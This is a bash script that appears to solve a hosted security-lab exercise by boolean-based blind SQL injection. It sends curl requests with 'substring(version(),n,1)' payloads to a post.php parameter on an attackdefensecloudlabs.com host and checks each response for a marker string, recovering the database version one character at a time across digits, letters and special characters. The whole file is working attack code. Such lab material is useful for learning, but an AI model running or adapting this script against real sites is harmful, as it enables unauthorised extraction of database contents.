#!/bin/bash

version=""
count=0
special_chars=('!' '-' '@' '#' '$' '%' '^' '&' '*' '(' ')' '_' '+' '=' '{' '}' '[' ']' '|' '\' ':' ';' '"' "'" '<' '>' ',' '.' '?' '/' '`' '~')

for count in {1..10};do
	special_char=true
	lower=true
	capital=true
	digits=true

	for i in ${special_chars[@]};do
		echo "Trying $i for Placeholder $count"
		if curl -s https://gpjajyqyyfmmmh4w1n67b.ap-southeast-6.attackdefensecloudlabs.com/post.php?post=1%20and%20substring%28version%28%29%2C$count%2C1%29%3D%27$i%27-- | grep -q -i "first Post-Introduction" ; then
			echo "Placeholder $count is $i"
			version=$version$i
			special_char=false
			break
		
		fi
	done

	if $special_char ;then
		echo "Not in special Letters trying with digits"
		for i in {0..9};do
			echo "Trying $i for Placeholder $count"
			if curl -s https://gpjajyqyyfmmmh4w1n67b.ap-southeast-6.attackdefensecloudlabs.com/post.php?post=1%20and%20substring%28version%28%29%2C$count%2C1%29%3D%27$i%27-- | grep -q -i "first Post-Introduction" ; then
				echo "Placeholder $count is $i"
				version=$version$i
				digits=false
				break
			
			fi
		done
	fi

	if $digits && $special_char ;then
		echo "Not in digits trying with lower case letters"
		for i in {a..z};do
			echo "Trying $i for Placeholder $count"
			if curl -s https://gpjajyqyyfmmmh4w1n67b.ap-southeast-6.attackdefensecloudlabs.com/post.php?post=1%20and%20substring%28version%28%29%2C$count%2C1%29%3D%27$i%27-- | grep -q -i "first Post-Introduction" ; then
				echo "Placeholder $count is $i"
				version=$version$i
				lower=false
				break
			
			fi
		done
	fi
	if $lower && $special_char && $digits ;then
		echo "Not in lower Letters and special letters and digits trying with capital case letters"
		for i in {A..Z};do
			echo "Trying $i for Placeholder $count"
			if curl -s https://gpjajyqyyfmmmh4w1n67b.ap-southeast-6.attackdefensecloudlabs.com/post.php?post=1%20and%20substring%28version%28%29%2C$count%2C1%29%3D%27$i%27-- | grep -q -i "first Post-Introduction" ; then
				echo "Placeholder $count is $i"
				version=$version$i
				capital=false
				break
			
			fi
		done
	fi



done
echo $version
